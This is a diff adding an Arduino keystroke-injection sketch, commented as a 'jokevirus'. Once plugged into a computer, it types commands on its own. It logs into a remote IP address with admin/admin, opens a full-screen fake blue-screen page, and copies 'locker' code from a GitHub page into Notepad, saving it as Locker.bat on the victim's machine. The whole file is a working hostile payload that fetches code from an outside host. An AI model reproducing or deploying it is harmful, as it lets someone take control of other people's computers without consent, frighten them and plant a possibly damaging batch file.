@@ -1,0 +1,122 @@
+#include "Keyboard.h"
+#define KEY_SPACE 0x20
+//키 하나를 입력하고 싶을 때
+void typeKey(int key)
+{
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+void setup()
+{
+
+  Keyboard.begin();
+  delay(2000);
+
+
+  //jokevirus
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+  delay(500);
+  Keyboard.print("http://158.247.252.46:8080/login");
+  typeKey(KEY_RETURN);
+  delay(1000);
+  typeKey(KEY_TAB);
+  Keyboard.print("admin");
+  delay(500);
+  typeKey(KEY_TAB);
+  Keyboard.print("admin");
+  delay(500);
+  typeKey(KEY_RETURN);
+  delay(100);
+  typeKey(KEY_TAB);
+  delay(100);
+  typeKey(KEY_TAB);
+  delay(100);
+  typeKey(KEY_TAB);
+  delay(100);
+  typeKey(KEY_RETURN);
+  delay(10000);
+
+  typeKey(KEY_LEFT_GUI);
+  delay(500);
+  Keyboard.print("alwa");
+  delay(500);
+  Keyboard.print("ys.");
+  delay(5000);
+  typeKey(KEY_RETURN);
+  delay(1000);
+
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+  delay(500);
+  Keyboard.print("chrome");
+  typeKey(KEY_RETURN);
+  delay(1000);
+  Keyboard.print("http://fakebsod.com/windows-8-and-10");
+  typeKey(KEY_RETURN);
+  delay(1000);
+  Keyboard.press(KEY_LEFT_CTRL);
+  delay(100);
+  Keyboard.press(KEY_SPACE);
+  delay(100);
+  Keyboard.releaseAll();
+  delay(1000);
+  typeKey(KEY_F11);
+  delay(500);
+
+  //깃허브에서 코드를 복사해 Locker 배치파일 만들기
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+  delay(500);
+  Keyboard.print("explorer https://github.com/yuchoimin/test/blob/main/locker%20%EC%BD%94%EB%93%9C");
+  typeKey(KEY_RETURN);
+  delay(3000);
+
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press('a');
+  Keyboard.releaseAll();
+  delay(1000);
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press('c');
+  Keyboard.releaseAll();
+  delay(1000);
+  
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.releaseAll();
+  delay(1000);
+  Keyboard.print("notepad");
+  delay(500);
+  typeKey(KEY_RETURN);
+  delay(1000);
+
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press('v');
+  Keyboard.releaseAll();
+  delay(1000);
+
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press('s');
+  Keyboard.releaseAll();
+  delay(500);
+  Keyboard.print("Locker.bat");
+  delay(500);
+  typeKey(KEY_TAB);
+  delay(50);
+  typeKey(KEY_DOWN_ARROW);
+  typeKey(KEY_DOWN_ARROW);
+  delay(500);
+  typeKey(KEY_RETURN);
+  typeKey(KEY_RETURN);
+  delay(1000);
+
+}
+
+void loop()
+{
+  // put your main code here, to run repeatedly:
+}
